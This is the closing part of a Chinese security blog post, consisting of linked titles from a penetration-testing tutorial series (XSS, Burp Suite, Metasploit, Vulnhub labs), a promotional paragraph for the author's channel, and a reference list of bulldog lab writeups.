*   [[网络安全] 六. XSS 跨站脚本攻击靶场案例九题及防御方法 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485174&idx=1&sn=245b812489c845e875cf4bc4763747b7&chksm=cfccb63bf8bb3f2d537f36093de80dbeed5a340b141001d3ef8a9ac9d6336e0aaf62b013a54c&scene=21#wechat_redirect)
    
*   [[网络安全] 七. Burp Suite 工具安装配置、Proxy 基础用法及暴库入门](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485381&idx=1&sn=9a0230cf22eba0a24152cb0e73a37224&chksm=cfccb708f8bb3e1ecf68078746521191921f41d19a0b82cb3f097856dad7a85c4d9c34750b3f&scene=21#wechat_redirect)
    
*   [[网络安全] 八. Web 漏洞及端口扫描之 Nmap、ThreatScan 和 DirBuster](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485437&idx=1&sn=2a7179464207fa68b708297ec0db6f00&chksm=cfccb730f8bb3e2629edb5ca114de79723e323512be9538a4d512297f8728a3a9d7718389b60&scene=21#wechat_redirect)
    
*   [[网络安全] 九. Wireshark 安装入门及抓取网站用户名密码 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485465&idx=1&sn=8e7f1f5790bfe754affe0599a3fce1ee&chksm=cfccb8d4f8bb31c2ca36f6467d700f4e4d7821899a6d5173ac0b525f0f6227c8392252b5c775&scene=21#wechat_redirect)
    
*   [[网络安全] 十. Wireshark 抓包原理、ARP 劫持、MAC 泛洪及数据追踪](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485551&idx=1&sn=15f00e14f4376e179a558444de8ef0a5&chksm=cfccb8a2f8bb31b456499a937598e750661841b5ca166a12073e343a049737fa3131fd422dc5&scene=21#wechat_redirect)
    
*   [[网络安全] 十一. Shodan 搜索引擎详解及 Python 命令行调用](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485599&idx=1&sn=0c60c042911fc79287417c2385550430&chksm=cfccb852f8bb3144a89f6b0d0df6c185a208aa989d98f8c7e3b7d741dedc371b3ecb4e70a747&scene=21#wechat_redirect)
    
*   [[网络安全] 十二. 文件上传漏洞 (1) 基础原理及 Caidao 入门知识](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485787&idx=1&sn=0c75cf81c4234031273bced4dff0b25c&chksm=cfccb996f8bb3080fe9583043b43665095fd6935a4147a2bb0d1ab9b91a6cde99da4747c5201&scene=21#wechat_redirect)
    
*   [[网络安全] 十三. 文件上传漏洞 (2) 常用绕过方法及 IIS6.0 解析漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485833&idx=1&sn=a613116633338ca85dfd1966052b0b02&chksm=cfccb944f8bb305296a32dac7f0942e727d66dc9f710bfb82c3597500e97d39714ecd2ed18cf&scene=21#wechat_redirect)
    
*   [[网络安全] 十四. 文件上传漏洞 (3) 编辑器漏洞和 IIS 高版本漏洞及防御](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485871&idx=1&sn=e6d0248e483dea9616a5d615f852eccb&chksm=cfccb962f8bb3074516c1ef8e01c7cb00a174fa5b1a51de3a49b13fd8c7846deeaf6d0e24480&scene=21#wechat_redirect)
    
*   [[网络安全] 十五. 文件上传漏洞 (4)Upload-labs 靶场及 CTF 题目 01-10](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488340&idx=1&sn=5b7bf5602294586f819340bd6190a34d&chksm=cfcca399f8bb2a8f746fc09c7142facc8ea17c008ba46dee423b90ff6abb3cd4486edf52d201&scene=21#wechat_redirect)
    
*   [[网络安全] 十六. 文件上传漏洞 (5) 绕狗一句话原理和绕过安全狗](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488396&idx=1&sn=67c1b13f041040c09c236bba99edfe0a&chksm=cfcca341f8bb2a5729778490db7441a4ddfdfa05dcc5f6322b4860db7780056f9f05f5bc0b3d&scene=21#wechat_redirect)  
    
*   [[网络安全] 十八. Metasploit 技术之基础用法万字详解及 MS17-010 漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488255&idx=1&sn=28b1f54fd420a0145cb95b842a36c567&chksm=cfcca232f8bb2b243bf4cbf5c1741c6af2c1fc666985d34b4f6b4a6ee3161d18975bb5ea18fc&scene=21#wechat_redirect)
    
*   [[网络安全] 十九. Metasploit 后渗透技术之信息收集和权限提权](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488639&idx=1&sn=dddd54eb0ba7cfdf71113a1f4a5c6548&chksm=cfcca4b2f8bb2da44c975ca12f16b4b76af351be4711ac7e77ca8622450a15c3af0172be3f9e&scene=21#wechat_redirect)
    
*   [[网络安全] 二十. Metasploit 后渗透技术之移植漏洞、深度提权和后门](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488738&idx=1&sn=8106362219d99ae6deb8aeca1f6b1dff&chksm=cfcca42ff8bb2d397c44b839700d92fd22e4ac60c403b96cba734bc523cb258dbd0db5309952&scene=21#wechat_redirect)
    
*   [[网络安全] 二十一. Chrome 密码保存渗透解析、Chrome 蓝屏漏洞及音乐软件漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488883&idx=1&sn=65c362cc4c3958aa747716d17b29eeb3&chksm=cfcca5bef8bb2ca895525a1964425d1dfe74001a33e3b59b18bf902539cfc4d941dd96c33863&scene=21#wechat_redirect)
    
*   [[网络安全] 二十二. Powershell 基础入门及常见用法 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489093&idx=1&sn=216374f1db9af3e1bb4f9431b66237a3&chksm=cfcca688f8bb2f9e9fc25c1d1e21d3bceae0a9ff026f57e6e6df2ffa20597aa8356c15ea2280&scene=21#wechat_redirect)
    
*   [[网络安全] 二十三. Powershell 基础入门之常见语法及注册表操作 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489150&idx=1&sn=969db0e97868fe64fb03776b77bf7d13&chksm=cfcca6b3f8bb2fa56d2c9e4b2bdbd5abcc04ee724ee6cd2abbb059fca9ae65d6595ca98c2624&scene=21#wechat_redirect)
    
*   [[网络安全] 二十四. Web 安全学习路线及木马、病毒和防御初探](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489258&idx=1&sn=0fcfeb9555982c10eca90d2a78c5b58f&chksm=cfcca627f8bb2f315c8b089fcbeded22ab3515980a618857349e606e049d6a8d73bf79743ffe&scene=21#wechat_redirect)
    
*   [[网络安全] 二十五. 虚拟机 VMware+Kali 安装入门及 Sqlmap 基本用法](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489455&idx=1&sn=3835d420386dfb1df32f0f550f21b0d8&chksm=cfcca762f8bb2e7493a99415b19145f8c35b9af19dd6904511d525485fb9f98e310eb12e3054&scene=21#wechat_redirect)
    
*   [[网络安全] 二十六. SQL 注入之揭秘 Oracle 数据库注入漏洞和致命问题（Cream 老师）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489552&idx=1&sn=9336824ddebde336766c51a3674cf764&chksm=cfcca8ddf8bb21cbd1e80f08b012f59cf3d1661e756cd44b335671f5d13392752e0f56f041c1&scene=21#wechat_redirect)
    
*   [[网络安全] 二十七. Vulnhub 靶机渗透之环境搭建及 JIS-CTF 入门和蚁剑提权示例 (1)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489805&idx=1&sn=89a3970bea60cc4792a3288b9250523d&chksm=cfcca9c0f8bb20d68828a34fcee212aabf869b3937d2cc12f3cf768dda5d1175fcce41ba32cf&scene=21#wechat_redirect)
    
*   [[网络安全] 二十八. Vulnhub 靶机渗透之 DC-1 提权和 Drupal 漏洞利用 (2)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247490070&idx=1&sn=f7060d391eae4c91901efb22d0f4f7ae&chksm=cfccaadbf8bb23cd6d87f2bf0095232f5872519fc04413bbcb3d1451a1a593d2d8f42e3df8ab&scene=21#wechat_redirect)
    
*   [[网络安全] 二十九. 小白渗透之路及 Web 渗透技术总结（i 春秋 YOU 老师）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247490243&idx=1&sn=d88c090287117977d12db27dca221f95&chksm=cfccaa0ef8bb23185205d68f1080c0bb3a4db9f77b39fa5fdaeb7f261fe022b2f7c0ec21e6f6&scene=21#wechat_redirect)
    
*   [网络安全] 三十. Vulnhub 靶机渗透之 bulldog 信息收集和 nc 反弹 shell(3)  
    

2020 年 8 月 18 新开的 “娜璋 AI 安全之家”，主要围绕 Python 大数据分析、网络空间安全、人工智能、Web 渗透及攻防技术进行讲解，同时分享 CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解 Python 和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。2021 年继续加油！

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZePZ27y7oibNu4BGibRAq4HydK4JWeQXtQMKibpFEkxNKClkDoicWRC06FHBp99ePyoKPGkOdPDezhg/640?wx_fmt=png)

(By:Eastmount 2021-04-30 周五夜于武汉)

参考文献：

*   [1] https://www.vulnhub.com/entry/bulldog-1%2C211/  
    
*   [2] Bulldog: 1 – Vulnhub Writeup - vonhewitt
    
*   [3] Vulnhub 靶场渗透练习 (三) bulldog - feizianquan
    
*   [4] VulnHub 靶机学习——BullDog 实战记录 - 安全师官方
    
*   [5] WriteUp|CTF-bulldog - cnsimo
    
*   [6] Vulnhub bulldog 靶机渗透 - A1oe
    
*   [7] VulnHub------bulldog - 大方子
    
*   [8] [VulnHub 靶机渗透] 一：BullDog2 - 工科学生死板板